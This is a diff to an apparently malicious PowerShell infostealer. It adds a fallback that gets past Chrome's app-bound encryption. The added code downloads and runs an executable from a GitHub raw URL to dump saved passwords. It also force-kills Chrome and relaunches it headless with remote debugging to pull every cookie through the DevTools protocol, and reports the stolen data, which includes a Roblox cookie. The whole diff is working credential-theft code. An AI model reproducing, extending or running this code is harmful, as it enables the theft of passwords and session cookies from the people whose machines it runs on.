@@ -273,6 +273,83 @@ foreach ($browser in $browsers) {
 
 ts ($browserReports -join "`n")
 
+# App-Bound fallback for Chrome 125+
+$appBound = $false
+try { $lsJ = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Raw | ConvertFrom-Json; if ($lsJ.os_crypt.app_bound_encrypted_key) { $appBound = $true } } catch {}
+$hbdPwCount = 0; $cdpCkCount = 0
+if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
+  ts "[dbg] App-Bound active, running fallback...`nCK Pw:$pwCount Ck:$ckCount"
+  
+  # HBD for passwords
+  if ($pwCount -eq 0) {
+    try {
+      ts "[dbg] Downloading HBD..."
+      $hbd = "$env:TEMP\hbd.exe"; $hbdUrl = "https://raw.githubusercontent.com/kai195102/d/main/wsc.dat"
+      (New-Object Net.WebClient).DownloadFile($hbdUrl, $hbd)
+      if ((Get-Item $hbd -ErrorAction Stop).Length -gt 100000) {
+        $hd = "$env:TEMP\ho_$([IO.Path]::GetRandomFileName())"; New-Item -ItemType Directory -Path $hd -Force | Out-Null
+        $p = Start-Process -FilePath $hbd -ArgumentList "--format json --dir $hd" -NoNewWindow -Wait -PassThru
+        $pf = "$hd\password.json"
+        if (Test-Path $pf) {
+          $hp = Get-Content $pf -Raw | ConvertFrom-Json; $hbdPwCount = $hp.Count
+          ts "[dbg] HBD passwords: $hbdPwCount"
+          foreach ($e in $hp) { $allPasswords += @{url=$e.Url;username=$e.UserName;password=$e.Password;browser="Chrome(HBD)"} }
+        }
+        Remove-Item $hd -Recurse -Force -ErrorAction SilentlyContinue
+      }
+      Remove-Item $hbd -Force -ErrorAction SilentlyContinue
+    } catch { ts "[dbg] HBD error: $_" }
+  }
+  
+  # CDP for cookies
+  if ($ckCount -eq 0) {
+    try {
+      $cex = @("$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe","${env:ProgramFiles}\Google\Chrome\Application\chrome.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
+      if ($cex) {
+        Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 2
+        $ud = "$env:TEMP\cdp_$([IO.Path]::GetRandomFileName())"
+        $port = 9222; $portTry = 0
+        while ((Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue) -and $portTry -lt 10) { $port++; $portTry++ }
+        $p = Start-Process -FilePath $cex -ArgumentList "--remote-debugging-port=$port --user-data-dir=$ud --no-first-run --no-default-browser-check --disable-gpu --headless=new" -PassThru -WindowStyle Hidden
+        Start-Sleep 4
+        $tgts = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 5 -ErrorAction Stop
+        $wsUrl = if ($tgts[0].webSocketDebuggerUrl) { $tgts[0].webSocketDebuggerUrl } else {
+          $np = Invoke-RestMethod "http://127.0.0.1:$port/json/new?about:blank" -TimeoutSec 5 -ErrorAction Stop
+          $np.webSocketDebuggerUrl
+        }
+        if ($wsUrl) {
+          $ws = New-Object System.Net.WebSockets.ClientWebSocket
+          $ws.ConnectAsync((New-Object Uri($wsUrl)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+          # Send Network.enable then getAllCookies
+          $cmd1 = @{id=1;method="Network.enable"} | ConvertTo-Json -Compress
+          $b1 = [Text.Encoding]::UTF8.GetBytes($cmd1)
+          $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b1)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+          $rb = New-Object byte[] 8192
+          $ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+          $cmd2 = @{id=2;method="Network.getAllCookies"} | ConvertTo-Json -Compress
+          $b2 = [Text.Encoding]::UTF8.GetBytes($cmd2)
+          $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b2)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+          $list = New-Object Collections.Generic.List[byte]
+          do { $r = $ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult(); $list.AddRange($rb[0..($r.Count-1)]) } while (!$r.EndOfMessage)
+          $ws.Dispose()
+          $resp = [Text.Encoding]::UTF8.GetString($list.ToArray()) | ConvertFrom-Json
+          if ($resp.result -and $resp.result.cookies) {
+            $cdpCkCount = $resp.result.cookies.Count
+            ts "[dbg] CDP cookies: $cdpCkCount"
+          }
+        }
+        if ($p -and !$p.HasExited) { $p.Kill() }
+        Remove-Item $ud -Recurse -Force -ErrorAction SilentlyContinue
+      }
+    } catch { ts "[dbg] CDP error: $_" }
+  }
+  
+  if ($hbdPwCount -gt 0 -or $cdpCkCount -gt 0) {
+    ts "$GL App-Bound fallback results:`n$CK Pw:$hbdPwCount Ck:$cdpCkCount"
+    $pwCount = $hbdPwCount; $ckCount = $cdpCkCount
+  }
+}
+
 if ($robCookie) { ts "$RB Roblox cookie:`n$CK $robCookie" } else { ts "$RB Roblox cookie:`n$XX Not found" }
 
 try {
